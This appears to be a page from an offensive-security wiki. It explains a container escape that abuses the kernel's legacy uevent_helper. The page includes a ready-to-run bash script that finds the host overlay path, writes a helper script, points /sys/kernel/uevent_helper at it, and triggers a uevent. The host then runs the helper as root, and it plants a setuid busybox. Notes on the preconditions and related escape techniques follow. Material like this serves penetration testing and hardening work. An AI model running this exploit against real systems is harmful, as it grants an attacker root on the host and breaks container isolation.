---
title: "uevent_helper: host code execution through the kernel device-event helper"
description: "Escaping a container by writing /sys/kernel/uevent_helper, the legacy program the kernel runs on a device uevent, then triggering a synthetic uevent so the attacker's program executes on the host as root."
keywords:
  - uevent_helper
  - sysfs escape
  - hotplug helper
  - container escape
  - CAP_SYS_ADMIN
---

# uevent_helper

`/sys/kernel/uevent_helper` is the legacy hotplug helper: a program the kernel forks, as root in the host context, on each device uevent. With a writable host `/sys` (privileged container or `CAP_SYS_ADMIN`), overwrite it with a host-visible helper and fire a synthetic uevent to run code on the host.

```bash
host_path=$(sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /proc/self/mountinfo | head -1)

cat > /x <<'SH'
#!/bin/sh
cp /bin/busybox /host_marker && chmod +s /host_marker
SH
chmod +x /x

echo "$host_path/x" > /sys/kernel/uevent_helper
# Trigger a uevent on any device
echo change > /sys/class/mem/null/uevent
```

## Exploitation notes

- `uevent_helper` is empty by default on modern systems (udev uses a netlink socket instead), so setting it at all is the attack; the kernel still honors it when non-empty.
- Writing any device's `uevent` file with an action keyword (`add`, `change`) generates the event that invokes the helper.
- A sibling of [core_pattern](core_pattern.md) and [modprobe path](modprobe-path.md): same gate, same host-visible-path trick.

## References

- [man 5 proc](https://man7.org/linux/man-pages/man5/proc.5.html)
- [Kernel: uevent and the hotplug helper](https://www.kernel.org/doc/html/latest/admin-guide/sysfs-rules.html)
